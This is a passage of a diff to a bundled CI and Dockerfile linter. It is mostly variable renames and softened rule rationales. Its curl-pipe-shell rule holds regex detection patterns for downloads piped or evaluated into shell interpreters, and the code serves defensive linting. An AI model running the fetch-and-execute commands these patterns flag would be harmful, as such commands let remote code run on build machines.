-  if (tool2 === "vitest --changed") return !/\s--changed(?:=\S+|\s+(?!-)\S+)/.test(text6);
+  if (tool2 === "vitest --changed") return !/\s--changed(?:=\S+|\s+(?!-)\S+)/.test(text7);
   return false;
 }
 var affected_base_ref_default = defineRule({
@@ -16063,21 +16063,21 @@ function resolveSelector(packages, raw) {
   const byBase = packages.filter((pkg) => posix.basename(pkg.dir) === selector);
   return byBase.length === 1 ? byBase[0] : void 0;
 }
-function selectorsOf(text6) {
+function selectorsOf(text7) {
   const found = [];
   const collect = (pattern) => {
-    for (const match2 of text6.matchAll(pattern)) if (match2[1]) found.push(match2[1]);
+    for (const match2 of text7.matchAll(pattern)) if (match2[1]) found.push(match2[1]);
   };
-  if (/\b(?:pnpm|turbo)\b/.test(text6)) collect(/(?:^|\s)(?:--filter|-F)(?:=|\s+)(\S+)/g);
-  if (/^(?:npm|npx)\s/.test(text6)) collect(/(?:^|\s)(?:--workspace|-w)(?:=|\s+)(\S+)/g);
-  if (/\blerna\b/.test(text6)) collect(/(?:^|\s)--scope(?:=|\s+)(\S+)/g);
+  if (/\b(?:pnpm|turbo)\b/.test(text7)) collect(/(?:^|\s)(?:--filter|-F)(?:=|\s+)(\S+)/g);
+  if (/^(?:npm|npx)\s/.test(text7)) collect(/(?:^|\s)(?:--workspace|-w)(?:=|\s+)(\S+)/g);
+  if (/\blerna\b/.test(text7)) collect(/(?:^|\s)--scope(?:=|\s+)(\S+)/g);
   collect(/\byarn\s+workspace\s+(\S+)/g);
   collect(/\bnx\s+run\s+([^\s:]+):/g);
   return found.length > 0 ? found : void 0;
 }
-function commandScope(packages, text6, cwd) {
-  if (TRIVIAL.test(text6) || INSTALL.test(text6) || /\s--version$/.test(text6)) return { kind: "neutral" };
-  const selectors = selectorsOf(text6);
+function commandScope(packages, text7, cwd) {
+  if (TRIVIAL.test(text7) || INSTALL.test(text7) || /\s--version$/.test(text7)) return { kind: "neutral" };
+  const selectors = selectorsOf(text7);
   if (selectors) {
     const resolved = selectors.map((selector) => resolveSelector(packages, selector));
     const [first] = resolved;
@@ -16174,12 +16174,12 @@ var sparse_checkout_default = defineRule({
           const base2 = direct2 ? step.workingDirectory ?? job.workingDirectory ?? workflow.workingDirectory : step.workingDirectory;
           let cwd = cleanPath(base2 ?? ".");
           for (const { command } of commandsOf(step)) {
-            const text6 = command.replace(/["']/g, "");
-            if (text6.startsWith("(")) unscoped = true;
-            const cd = /^cd\s+(\S+)$/.exec(text6);
+            const text7 = command.replace(/["']/g, "");
+            if (text7.startsWith("(")) unscoped = true;
+            const cd = /^cd\s+(\S+)$/.exec(text7);
             if (cd?.[1] !== void 0) cwd = cd[1] === "-" ? void 0 : joinPath(cwd, cd[1]);
-            if (INSTALL.test(text6) && !/\s(?:--filter|-F|--workspace|-w)\b|\bfocus\b/.test(text6)) wholeInstall = true;
-            const scope2 = commandScope(packages, text6, cwd);
+            if (INSTALL.test(text7) && !/\s(?:--filter|-F|--workspace|-w)\b|\bfocus\b/.test(text7)) wholeInstall = true;
+            const scope2 = commandScope(packages, text7, cwd);
             if (scope2.kind === "unscoped") unscoped = true;
             if (scope2.kind === "package") targets.add(scope2.pkg);
           }
@@ -16222,8 +16222,8 @@ function lineAt(content2, offset) {
   }
   return line;
 }
-function blank(text6) {
-  return text6.replace(/[^\r\n]/g, " ");
+function blank(text7) {
+  return text7.replace(/[^\r\n]/g, " ");
 }
 function escapeOf(content2) {
   const directive = /^#\s*escape\s*=\s*(`|\\)/im.exec(content2.split(/\r?\n/).slice(0, 5).join("\n"));
@@ -16239,8 +16239,8 @@ function splitShell(script, base2) {
   const push = (end) => {
     const piece = script.slice(start2, end);
     const lead = piece.length - piece.trimStart().length;
-    const text6 = piece.trim();
-    if (text6) result.push({ text: text6, offset: base2 + start2 + lead });
+    const text7 = piece.trim();
+    if (text7) result.push({ text: text7, offset: base2 + start2 + lead });
   };
   for (let index = 0; index < script.length; index += 1) {
     const char = script[index] ?? "";
@@ -16271,27 +16271,27 @@ function splitShell(script, base2) {
   return result;
 }
 function toCommand(content2, piece, fallbackLine) {
-  let text6 = piece.text;
+  let text7 = piece.text;
   let offset = piece.offset;
   for (; ; ) {
-    const assignment = ASSIGNMENT.exec(text6);
-    if (assignment && assignment[0].length < text6.length) {
-      text6 = text6.slice(assignment[0].length);
+    const assignment = ASSIGNMENT.exec(text7);
+    if (assignment && assignment[0].length < text7.length) {
+      text7 = text7.slice(assignment[0].length);
       offset += assignment[0].length;
       continue;
     }
-    const first = /^(\S+)\s+/.exec(text6);
+    const first = /^(\S+)\s+/.exec(text7);
     if (first?.[1] && WRAPPERS2.has(first[1])) {
-      text6 = text6.slice(first[0].length);
+      text7 = text7.slice(first[0].length);
       offset += first[0].length;
       continue;
     }
     break;
   }
-  const words6 = text6.split(/\s+/).filter(Boolean).map(unquote);
+  const words6 = text7.split(/\s+/).filter(Boolean).map(unquote);
   if (words6.length === 0) return void 0;
   const known2 = content2 !== void 0 && offset >= 0;
-  return { text: text6, words: words6, line: known2 ? lineAt(content2, offset) : fallbackLine, offset: known2 ? offset : -1 };
+  return { text: text7, words: words6, line: known2 ? lineAt(content2, offset) : fallbackLine, offset: known2 ? offset : -1 };
 }
 function shellCommands(file, instruction2) {
   if (instruction2.keyword !== "RUN") return [];
@@ -16692,31 +16692,31 @@ var apt_hygiene_default = defineRule({
 function isBuildPush2(step) {
   return usesAction(step, "docker/build-push-action");
 }
-function isDynamic(text6) {
-  return text6.includes("${{") || text6.includes("$");
+function isDynamic(text7) {
+  return text7.includes("${{") || text7.includes("$");
 }
 function literalWith2(step, key2) {
   const entry2 = step.with.get(key2);
   if (!entry2 || entry2.kind !== "literal" || entry2.value === void 0 || entry2.value === null) return void 0;
-  const text6 = String(entry2.value);
-  return isDynamic(text6) ? void 0 : text6;
+  const text7 = String(entry2.value);
+  return isDynamic(text7) ? void 0 : text7;
 }
-function parseCacheEntry(text6) {
+function parseCacheEntry(text7) {
   const attributes = /* @__PURE__ */ new Map();
   const field3 = /"((?:[^"]|"")*)"|([^",]*)/y;
-  for (let index = 0; index <= text6.length; ) {
+  for (let index = 0; index <= text7.length; ) {
     field3.lastIndex = index;
-    const match2 = field3.exec(text6);
-    if (!match2 || field3.lastIndex < text6.length && text6[field3.lastIndex] !== ",") {
-      return { type: "", attributes: /* @__PURE__ */ new Map(), text: text6 };
+    const match2 = field3.exec(text7);
+    if (!match2 || field3.lastIndex < text7.length && text7[field3.lastIndex] !== ",") {
+      return { type: "", attributes: /* @__PURE__ */ new Map(), text: text7 };
     }
     const part2 = match2[1] === void 0 ? match2[2] ?? "" : match2[1].replace(/""/g, '"');
     const eq = part2.indexOf("=");
     if (eq > 0) attributes.set(part2.slice(0, eq).trim().toLowerCase(), part2.slice(eq + 1).trim());
     index = field3.lastIndex + 1;
   }
-  const type = attributes.get("type") ?? (text6.includes("=") ? "" : "registry");
-  return { type: type.toLowerCase(), attributes, text: text6 };
+  const type = attributes.get("type") ?? (text7.includes("=") ? "" : "registry");
+  return { type: type.toLowerCase(), attributes, text: text7 };
 }
 function cacheEntries2(entry2) {
   if (!entry2 || entry2.kind === "expression" || typeof entry2.value !== "string") return [];
@@ -16930,13 +16930,13 @@ function stageAncestry(model, stage) {
     current = parent;
   }
 }
-function withEntryLine(file, entry2, text6) {
+function withEntryLine(file, entry2, text7) {
   const lines = typeof entry2.value === "string" ? entry2.value.split("\n").length : 1;
   const keyIndent = /^\s*/.exec(lineText(file.content, entry2.line))?.[0].length ?? 0;
   for (let line = entry2.line; line <= entry2.line + lines + 1; line += 1) {
     const content2 = lineText(file.content, line);
     if (line > entry2.line && content2.trim() !== "" && (/^\s*/.exec(content2)?.[0].length ?? 0) <= keyIndent) return void 0;
-    if (content2.includes(text6)) return line;
+    if (content2.includes(text7)) return line;
   }
   return void 0;
 }
@@ -17208,12 +17208,12 @@ var SHELLS = /* @__PURE__ */ new Set(["sh", "bash", "zsh", "dash", "ksh", "ash",
 var SCRIPT_INTERPRETERS = /^(python[\d.]*|perl|ruby|node)$/;
 var CURL_ARG_LETTERS = /* @__PURE__ */ new Set([..."AbcCdDeEFHKmPQrTuUwxXyYz"]);
 var WGET_ARG_LETTERS = /* @__PURE__ */ new Set([..."aAbBDeiIlPQRtTUwXo"]);
-function words(text6) {
-  const tokens = shellTokens(text6);
+function words(text7) {
+  const tokens = shellTokens(text7);
   let end = 0;
-  for (const token of tokens) end = text6.indexOf(token.raw, end) + token.raw.length;
-  if (text6.slice(end).trim() !== "") return [];
-  return commandTokens(text6).map((token) => token.value);
+  for (const token of tokens) end = text7.indexOf(token.raw, end) + token.raw.length;
+  if (text7.slice(end).trim() !== "") return [];
+  return commandTokens(text7).map((token) => token.value);
 }
 function unquote2(word) {
   return word.replace(/^["']+|["']+$/g, "");
@@ -17316,18 +17316,18 @@ function stdinInterpreter(args) {
   }
   return void 0;
 }
-function pipelines(text6) {
+function pipelines(text7) {
   const result = [];
   let stages = [];
   let stageStart = 0;
   let quote2;
   const endStage = (end) => {
-    stages.push({ text: text6.slice(stageStart, end), offset: stageStart });
+    stages.push({ text: text7.slice(stageStart, end), offset: stageStart });
   };
-  for (let index = 0; index < text6.length; index += 1) {
-    const char = text6[index];
-    const next = text6[index + 1];
-    const previous2 = text6[index - 1];
+  for (let index = 0; index < text7.length; index += 1) {
+    const char = text7[index];
+    const next = text7[index + 1];
+    const previous2 = text7[index - 1];
     if (quote2) {
       if (char === quote2) quote2 = void 0;
       else if (char === "\\" && quote2 === '"') index += 1;
@@ -17357,19 +17357,19 @@ function pipelines(text6) {
       stageStart = index + 1;
     }
   }
-  endStage(text6.length);
+  endStage(text7.length);
   result.push(stages);
   return result;
 }
-function firstUrl(text6) {
-  return /\bhttps?:\/\/[^\s"'`)|;]+/.exec(text6)?.[0];
+function firstUrl(text7) {
+  return /\bhttps?:\/\/[^\s"'`)|;]+/.exec(text7)?.[0];
 }
-function leadingSpace(text6) {
-  return text6.length - text6.trimStart().length;
+function leadingSpace(text7) {
+  return text7.length - text7.trimStart().length;
 }
-function commandFindings(text6) {
+function commandFindings(text7) {
   const result = [];
-  for (const stages of pipelines(text6)) {
+  for (const stages of pipelines(text7)) {
     for (let index = 0; index < stages.length - 1; index += 1) {
       const stage = stages[index];
       if (!stage) continue;
@@ -17382,7 +17382,7 @@ function commandFindings(text6) {
       const end = target.offset + target.text.trimEnd().length;
       const offset = stage.offset + leadingSpace(stage.text);
       const url = firstUrl(stage.text);
-      result.push({ offset, command: text6.slice(offset, end).replace(/\s+/g, " "), interpreter, ...url ? { url } : {} });
+      result.push({ offset, command: text7.slice(offset, end).replace(/\s+/g, " "), interpreter, ...url ? { url } : {} });
       break;
     }
   }
@@ -17392,30 +17392,30 @@ function commandFindings(text6) {
     /^\s*(eval)\s+"?(?:\$\(|`)\s*(?:curl|wget)\b[^)`]*[)`]"?/g
   ];
   for (const pattern of substitutions) {
-    for (let match2 = pattern.exec(text6); match2; match2 = pattern.exec(text6)) {
+    for (let match2 = pattern.exec(text7); match2; match2 = pattern.exec(text7)) {
       const body = /(?:<\(|\$\(|`)\s*((?:sudo\s+)?(?:curl|wget)\b[^)`]*)/.exec(match2[0])?.[1];
       if (!body || !downloadsToStdout(words(body))) continue;
       const prefix = match2[0].slice(0, match2[0].indexOf(body)).trimEnd().replace(/(?:<\(|\$\(|`)$/, "").trimEnd().replace(/"$/, "");
       const outer = words(prefix);
       if (outer.length === 0 || nonexecutingShell(outer.slice(1))) continue;
       const offset = match2.index + leadingSpace(match2[0].replace(/^[;&|({!]/, " "));
-      const command = text6.slice(offset, match2.index + match2[0].length).replace(/\s+/g, " ");
+      const command = text7.slice(offset, match2.index + match2[0].length).replace(/\s+/g, " ");
       const url = firstUrl(command);
       result.push({ offset, command, interpreter: basename2(match2[1] ?? "sh"), ...url ? { url } : {} });
     }
   }
   return result;
 }
-function findings(text6) {
-  return splitShellCommands(text6).flatMap(
+function findings(text7) {
+  return splitShellCommands(text7).flatMap(
     ({ command, offset }) => commandFindings(command).map((finding3) => ({ ...finding3, offset: offset + finding3.offset }))
   );
 }
-function clean(text6) {
-  return text6.split("\n").map((line) => line.trimStart().startsWith("#") ? " ".repeat(line.length) : line).join("\n").replace(/\\[ \t]*\r?\n/g, (match2) => " ".repeat(match2.length));
+function clean(text7) {
+  return text7.split("\n").map((line) => line.trimStart().startsWith("#") ? " ".repeat(line.length) : line).join("\n").replace(/\\[ \t]*\r?\n/g, (match2) => " ".repeat(match2.length));
 }
-function newlines(text6) {
-  return text6.match(/\n/g)?.length ?? 0;
+function newlines(text7) {
+  return text7.match(/\n/g)?.length ?? 0;
 }
 function describe2(finding3) {
   const source = finding3.url ? `${finding3.url.startsWith("http://") ? "over plain HTTP from " : "from "}\`${finding3.url}\`` : "from the network";
@@ -17454,8 +17454,8 @@ var curl_pipe_shell_default = defineRule({
           if (!step.run) continue;
           const shell = step.shell ?? job.shell ?? workflow.shell;
           if (shell && /^(pwsh|powershell|cmd|python)\b/i.test(shell.trim())) continue;
-          const text6 = clean(step.run.value);
-          for (const finding3 of findings(text6)) {
+          const text7 = clean(step.run.value);
+          for (const finding3 of findings(text7)) {
             const line = runLine(step, finding3.offset);
             const url = downloadUrl(finding3);
             report({
@@ -17480,8 +17480,8 @@ var curl_pipe_shell_default = defineRule({
       for (const instruction2 of model.instructions) {
         if (instruction2.keyword !== "RUN") continue;
         const raw = file.content.slice(lineStart(file.content, instruction2.line), lineStart(file.content, instruction2.endLine + 1));
-        const text6 = clean(raw.replace(/^(\s*)RUN\b(?:\s+--[a-z-]+(?:=\S*)?)*/i, (match2) => " ".repeat(match2.length)));
-        for (const finding3 of findings(text6)) {
+        const text7 = clean(raw.replace(/^(\s*)RUN\b(?:\s+--[a-z-]+(?:=\S*)?)*/i, (match2) => " ".repeat(match2.length)));
+        for (const finding3 of findings(text7)) {
           const line = instruction2.line + newlines(raw.slice(0, finding3.offset));
           const url = finding3.url ?? "<url>";
           report({
@@ -17519,8 +17519,8 @@ var LAYERING = {
   composer: "`COPY composer.json composer.lock ./`, `RUN composer install --no-scripts --no-autoloader`, then `COPY . .` and `composer dump-autoload`"
 };
 var JS = /* @__PURE__ */ new Set(["npm", "pnpm", "yarn", "bun"]);
-function excerpt(text6) {
-  const flat = text6.replace(/\s+/g, " ").trim();
+function excerpt(text7) {
+  const flat = text7.replace(/\s+/g, " ").trim();
   return flat.length > 60 ? `${flat.slice(0, 57)}...` : flat;
 }
 var dependency_layer_default = defineRule({
@@ -17591,10 +17591,10 @@ var dependency_layer_default = defineRule({
 // src/lint/rules/containers/docker-no-cache-build.ts
 var DEVELOPMENT_TRIGGERS = ["pull_request", "pull_request_target", "merge_group"];
 function rebuildOnly(condition) {
-  const expression = (condition ?? "").trim().replace(/^\$\{\{\s*|\s*\}\}$/g, "");
-  if (expression === "false") return true;
-  if (expression.includes("||")) return false;
-  return expression.split("&&").some(
+  const expression2 = (condition ?? "").trim().replace(/^\$\{\{\s*|\s*\}\}$/g, "");
+  if (expression2 === "false") return true;
+  if (expression2.includes("||")) return false;
+  return expression2.split("&&").some(
     (atom) => /^\s*\(?\s*github\.event_name\s*==\s*['"](?:schedule|workflow_dispatch|release)['"]\s*\)?\s*$/.test(atom) || /^\s*startsWith\(\s*github\.ref\s*,\s*['"]refs\/tags\/['"]\s*\)\s*$/.test(atom)
   );
 }
@@ -17986,7 +17986,7 @@ function referencedDimensions(job, step, command) {
     }
   }
   const names = /* @__PURE__ */ new Set();
-  for (const text6 of texts) for (const match2 of text6.matchAll(MATRIX_REFERENCE)) if (match2[1]) names.add(match2[1]);
+  for (const text7 of texts) for (const match2 of text7.matchAll(MATRIX_REFERENCE)) if (match2[1]) names.add(match2[1]);
   return [...names];
 }
 function cacheTo(site) {
@@ -18159,8 +18159,8 @@ var gha_cache_mode_min_default = defineRule({
     for (const workflow of [...project.workflows, ...project.actions]) {
       for (const job of workflow.jobs) {
         for (const site of jobBuilds(workflow, job)) {
-          const entries2 = siteCacheEntries(site, "cache-to");
-          const minimal = entries2.filter((entry2) => {
+          const entries3 = siteCacheEntries(site, "cache-to");
+          const minimal = entries3.filter((entry2) => {
             if (!MODE_EXPORTERS.has(entry2.type)) return false;
             const mode = entry2.attributes.get("mode")?.toLowerCase();
             return mode === void 0 || mode === "min";
@@ -18290,7 +18290,7 @@ var multi_stage_default = defineRule({
       const runtime = RUNTIME_HINTS.find((hint) => evidence2.some((entry2) => hint.pattern.test(entry2.label.replace(/^`/, ""))))?.runtime ?? "a `-slim` or distroless image";
       const related2 = [];
       for (const entry2 of evidence2) {
-        if (!related2.some((location2) => location2.line === entry2.line)) related2.push({ path: model.path, line: entry2.line });
+        if (!related2.some((location3) => location3.line === entry2.line)) related2.push({ path: model.path, line: entry2.line });
       }
       const shown = evidence2.slice(0, 3).map((entry2) => `${entry2.label} (line ${entry2.line})`);
       report({
@@ -18812,9 +18812,9 @@ Use a reviewed image digest such as \`ghcr.io/<owner>/<repo>/ci-tools@sha256:<di
 // src/lint/rules/containers/shared-base.ts
 var HOUSEKEEPING = /^(set|true|:|echo|rm|apt-get (update|clean|autoclean)|apt (update|clean)|apk update|ln|mkdir|chmod|chown|cd)\b/;
 var TOOL_INSTALL = /^(npm (i|install) (-g|--global)|pnpm add -g|corepack (enable|prepare)|pip3? install|python3? -m pip install|gem install|go install|cargo install|curl|wget|dnf install|yum install|microdnf install|apk add|apt-get install|apt install)\b/;
-function hash(text6) {
+function hash(text7) {
   let value2 = 5381;
-  for (let index = 0; index < text6.length; index += 1) value2 = (value2 * 33 ^ text6.charCodeAt(index)) >>> 0;
+  for (let index = 0; index < text7.length; index += 1) value2 = (value2 * 33 ^ text7.charCodeAt(index)) >>> 0;
   return value2.toString(16).padStart(8, "0");
 }
 function baseOf(stage) {
@@ -18829,7 +18829,7 @@ function preamble(file, model, stage) {
     if (contextSources(instruction2) !== void 0) break;
     if (instruction2.keyword !== "RUN") continue;
     for (const command of shellCommands(file, instruction2)) {
-      const text6 = command.words.join(" ");
+      const text7 = command.words.join(" ");
       const system = systemInstall(command.words);
       if (system) {
         const set = packages.get(system.installer) ?? /* @__PURE__ */ new Set();
@@ -18838,9 +18838,9 @@ function preamble(file, model, stage) {
         installs += 1;
         continue;
       }
-      if (HOUSEKEEPING.test(text6) || isDependencyInstall(command)) continue;
-      if (TOOL_INSTALL.test(text6)) installs += 1;
-      commands.push(text6);
+      if (HOUSEKEEPING.test(text7) || isDependencyInstall(command)) continue;
+      if (TOOL_INSTALL.test(text7)) installs += 1;
+      commands.push(text7);
     }
   }
   if (installs === 0) return void 0;
@@ -18854,8 +18854,8 @@ function isDependencyInstall(command) {
   return dependencyInstall(command.words) !== void 0;
 }
 function summarize(steps2) {
-  const text6 = steps2.map((step) => `\`${step.length > 50 ? `${step.slice(0, 47)}...` : step}\``).slice(0, 3).join(", ");
-  return steps2.length > 3 ? `${text6} and ${steps2.length - 3} more` : text6;
+  const text7 = steps2.map((step) => `\`${step.length > 50 ? `${step.slice(0, 47)}...` : step}\``).slice(0, 3).join(", ");
+  return steps2.length > 3 ? `${text7} and ${steps2.length - 3} more` : text7;
 }
 function imageName2(base2) {
   const name = base2.split("@")[0]?.split(":")[0]?.split("/").pop() ?? "app";
@@ -18865,8 +18865,8 @@ var shared_base_default = defineRule({
   meta: {
     id: "containers/shared-base",
     ruleset: "containers",
-    description: "Dockerfiles that repeat the same base image and toolchain preamble should share a base image published to GHCR.",
-    rationale: "When several services start from the same image and install the same toolchain, every service build and every runner repeats that work and stores its own copy of the layer. Publishing the preamble once as a shared base image (referenced by digest) builds it once, lets every service and agent sandbox pull the identical cached layer, and turns toolchain upgrades into a single reviewed digest bump.",
+    description: "Review repeated base-image and toolchain preambles for possible shared-base reuse.",
+    rationale: "A published shared base can move repeated toolchain installation into a separate build, but existing layer caches may already reuse that work. Compare build savings with publication and image-pull costs, preserve platform and per-service requirements, and maintain reviewed digest updates. Matching preamble text alone does not prove equivalent execution or a speedup.",
     kind: "insight",
     defaultSeverity: "info",
     presets: ["insights"],
@@ -18899,17 +18899,17 @@ ${entry2.steps.join("\n")}`;
         groups.set(signature2, [...groups.get(signature2) ?? [], entry2]);
       }
     }
-    for (const [signature2, entries2] of groups) {
-      if (entries2.length < options.minDockerfiles) continue;
-      const [first, ...others] = entries2;
+    for (const [signature2, entries3] of groups) {
+      if (entries3.length < options.minDockerfiles) continue;
+      const [first, ...others] = entries3;
       if (!first) continue;
       report({
         path: first.model.path,
         line: first.stage.line,
         key: `base:${first.base}:${hash(signature2)}`,
         confidence: "medium",
-        message: `${entries2.length} Dockerfiles start from \`${first.base}\` and repeat the same toolchain preamble (${summarize(first.steps)}).`,
-        suggestion: `Move \`FROM ${first.base}\` and the shared install steps into one base Dockerfile, publish it from CI to \`ghcr.io/<org>/${imageName2(first.base)}-base\`, and start each of these Dockerfiles with \`FROM ghcr.io/<org>/${imageName2(first.base)}-base@sha256:<digest>\` (Dependabot can bump the digest). The layer is then built once and shared across the monorepo.`,
+        message: `${entries3.length} Dockerfiles start from \`${first.base}\` and repeat the same toolchain preamble (${summarize(first.steps)}).`,
+        suggestion: `Consider publishing a shared base containing \`FROM ${first.base}\` and the common install steps, consumed as \`ghcr.io/<org>/${imageName2(first.base)}-base@sha256:<digest>\`. Preserve platform and service requirements, and measure the result against existing layer-cache reuse.`,
         related: others.map((entry2) => ({ path: entry2.model.path, line: entry2.stage.line }))
       });
     }
@@ -18945,9 +18945,9 @@ function serviceOptions(workflow, job, service) {
   const options = field(source, field(source, services, service.name)?.value, "options");
   if (!options) return null;
   const value2 = toJS(source, options.value);
-  const text6 = Array.isArray(value2) ? value2.map(String).join(" ") : typeof value2 === "string" ? value2 : void 0;
-  if (text6 === void 0 || text6.includes("${{")) return void 0;
-  return text6;
+  const text7 = Array.isArray(value2) ? value2.map(String).join(" ") : typeof value2 === "string" ? value2 : void 0;
+  if (text7 === void 0 || text7.includes("${{")) return void 0;
+  return text7;
 }
 function sleepSeconds(command) {
   const words6 = commandWords(command);
@@ -18998,8 +18998,8 @@ var sleep_polling_health_check_default = defineRule({
           const loop = LOOP.test(step.run.value);
           for (const { command, line } of commandsOf(step)) {
             if (BACKGROUND.some((pattern) => pattern.test(command))) background = true;
-            const seconds3 = sleepSeconds(command);
-            if (background || loop || seconds3 === void 0 || seconds3 < minSeconds) continue;
+            const seconds2 = sleepSeconds(command);
+            if (background || loop || seconds2 === void 0 || seconds2 < minSeconds) continue;
             const names = unchecked.map(({ service }) => `\`${service.name}\` (\`${service.image.value}\`)`).join(", ");
             const snippets = unchecked.map(
               ({ service, options: existing }) => `  ${service.name}:
@@ -19015,7 +19015,7 @@ ${existing ? `      ${existing.trim().replace(/\s+/g, " ")}
               path: workflow.path,
               line,
               key: `${step.key}:sleep-health:${line}`,
-              message: `\`${command.trim()}\` waits a fixed ${seconds3}s in job \`${job.id}\`, whose service container${unchecked.length > 1 ? "s" : ""} ${names} ${unchecked.length > 1 ? "have" : "has"} no explicit workflow \`--health-cmd\`. The image may already have HEALTHCHECK, and the sleep may await something else; verify its purpose before replacing it.`,
+              message: `\`${command.trim()}\` waits a fixed ${seconds2}s in job \`${job.id}\`, whose service container${unchecked.length > 1 ? "s" : ""} ${names} ${unchecked.length > 1 ? "have" : "has"} no explicit workflow \`--health-cmd\`. The image may already have HEALTHCHECK, and the sleep may await something else; verify its purpose before replacing it.`,
               suggestion: `If the sleep only waits for service readiness, consider an equivalent probe. Preserve existing service environment, ports, credentials and options, and validate slow-start behavior before deleting \`${command.trim()}\`. Example options to adapt:
 services:
 ${snippets}`,
@@ -19094,26 +19094,26 @@ function parseDockerfile(path, content2) {
       continue;
     }
     const startLine = index + 1;
-    let text6 = trimmed;
-    while (text6.endsWith(escape) && index + 1 < lines.length) {
-      text6 = text6.slice(0, -1);
+    let text7 = trimmed;
+    while (text7.endsWith(escape) && index + 1 < lines.length) {
+      text7 = text7.slice(0, -1);
       index += 1;
       const next = (lines[index] ?? "").trim();
       if (next.startsWith("#")) continue;
-      text6 += ` ${next}`;
+      text7 += ` ${next}`;
     }
-    const heredoc = /<<-?["']?([A-Za-z_][A-Za-z0-9_]*)["']?/.exec(text6);
+    const heredoc = /<<-?["']?([A-Za-z_][A-Za-z0-9_]*)["']?/.exec(text7);
     if (heredoc?.[1]) {
       const terminator = heredoc[1];
       while (index + 1 < lines.length) {
         index += 1;
         const body = lines[index] ?? "";
         if (body.trim() === terminator) break;
-        text6 += `
+        text7 += `
 ${body}`;
       }
     }
-    const match2 = /^([A-Za-z]+)\s*([\s\S]*)$/.exec(text6);
+    const match2 = /^([A-Za-z]+)\s*([\s\S]*)$/.exec(text7);
     if (match2?.[1]) {
       const { flags, args } = splitFlags(match2[2] ?? "");
       instructions.push({
@@ -19193,7 +19193,7 @@ var docker_base_digest_default = defineRule({
     id: "hermeticity/docker-base-digest",
     ruleset: "hermeticity",
     description: "Dockerfile base images should use pinned versions (and digests when required).",
-    rationale: "`FROM image` or `FROM image:latest` silently changes whenever upstream publishes, which breaks reproducibility and invalidates the layer cache for every following instruction. A version tag makes upgrades explicit; a digest makes builds fully reproducible.",
+    rationale: "Untagged and latest-tag base images can change when their registry tags move, affecting build inputs and layer reuse. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not make the entire build reproducible, because downloads, toolchains and other inputs may still vary.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -19388,7 +19388,7 @@ var pin_container_images_default = defineRule({
     id: "hermeticity/pin-container-images",
     ruleset: "hermeticity",
     description: "Job containers and service containers should use pinned image versions.",
-    rationale: "An image with no tag or `:latest` changes whenever upstream publishes, so a job's toolchain or a service's database version can change between two runs of the same commit. A version tag makes upgrades explicit; a digest makes them fully reproducible.",
+    rationale: "Untagged and latest-tag images can change between runs when registry tags move. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not establish reproducibility of the full job or of mutable external dependencies.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -19434,8 +19434,8 @@ var pin_container_images_default = defineRule({
 var import_yaml9 = __toESM(require_dist(), 1);
 var LATEST = /^(ubuntu|windows|macos)-latest$/i;
 var MATRIX_REF = /^\$\{\{\s*matrix\.([A-Za-z0-9_-]+)\s*\}\}$/;
-function escapeRegExp(text6) {
-  return text6.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+function escapeRegExp(text7) {
+  return text7.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
 }
 function osOf(label) {
   return label.toLowerCase().split("-")[0];
@@ -19686,7 +19686,7 @@ function lineLookup(content2) {
 }
 function lexNix(content2) {
   const out = content2.split("");
-  const strings2 = [];
+  const strings3 = [];
   const length = content2.length;
   const blank2 = (from, to) => {
     for (let index = from; index < to; index += 1) {
@@ -19752,13 +19752,13 @@ function lexNix(content2) {
       }
       if (char === '"') {
         blank2(literalStart, index);
-        strings2.push({ start: start2, end: index + 1, value: content2.slice(start2 + 1, index), interpolated, indented: false });
+        strings3.push({ start: start2, end: index + 1, value: content2.slice(start2 + 1, index), interpolated, indented: false });
         return index + 1;
       }
       index += 1;
     }
     blank2(literalStart, length);
-    strings2.push({ start: start2, end: length, value: content2.slice(start2 + 1), interpolated, indented: false });
+    strings3.push({ start: start2, end: length, value: content2.slice(start2 + 1), interpolated, indented: false });
     return length;
   };
   const indented = (start2) => {
@@ -19776,7 +19776,7 @@ function lexNix(content2) {
       }
       if (content2.startsWith("''", index)) {
         blank2(literalStart, index);
-        strings2.push({ start: start2, end: index + 2, value: content2.slice(start2 + 2, index), interpolated, indented: true });
+        strings3.push({ start: start2, end: index + 2, value: content2.slice(start2 + 2, index), interpolated, indented: true });
         return index + 2;
       }
       if (content2[index] === "$" && content2[index + 1] === "$") {
@@ -19793,33 +19793,33 @@ function lexNix(content2) {
       index += 1;
     }
     blank2(literalStart, length);
-    strings2.push({ start: start2, end: length, value: content2.slice(start2 + 2), interpolated, indented: true });
+    strings3.push({ start: start2, end: length, value: content2.slice(start2 + 2), interpolated, indented: true });
     return length;
   };
   code3(0, false);
-  strings2.sort((a, b) => a.start - b.start);
-  return { masked: out.join(""), strings: strings2 };
+  strings3.sort((a, b) => a.start - b.start);
+  return { masked: out.join(""), strings: strings3 };
 }
 function parseNix(path, content2) {
-  const { masked, strings: strings2 } = lexNix(content2);
+  const { masked, strings: strings3 } = lexNix(content2);
   const lineOf = lineLookup(content2);
   const idents = [];
   const pattern = /[A-Za-z_][A-Za-z0-9_'-]*(?:\.[A-Za-z_][A-Za-z0-9_'-]*)*/g;
   for (const match2 of masked.matchAll(pattern)) {
     const offset = match2.index;
-    const text6 = match2[0];
+    const text7 = match2[0];
     const before = masked[offset - 1] ?? "";
-    const after2 = masked[offset + text6.length] ?? "";
+    const after2 = masked[offset + text7.length] ?? "";
     if (before === "/" || before === "." || before === "<" || IDENT_CHAR.test(before)) continue;
     if (after2 === "/" || after2 === ">") continue;
-    idents.push({ text: text6, segments: text6.split("."), offset, end: offset + text6.length, line: lineOf(offset) });
+    idents.push({ text: text7, segments: text7.split("."), offset, end: offset + text7.length, line: lineOf(offset) });
   }
   return {
     path,
     dir: dirOf2(path),
     content: content2,
     masked,
-    strings: strings2.map((string3) => ({ ...string3, line: lineOf(string3.start) })),
+    strings: strings3.map((string4) => ({ ...string4, line: lineOf(string4.start) })),
     idents,
     lineOf
   };
@@ -19840,10 +19840,10 @@ function nixStructure(file) {
     const char = masked[index];
     if (char === "{" || char === "(" || char === "[") stack.push({ offset: index, epoch: epoch2 });
     else if (char === "}" || char === ")" || char === "]") {
-      const open3 = stack.pop();
+      const open4 = stack.pop();
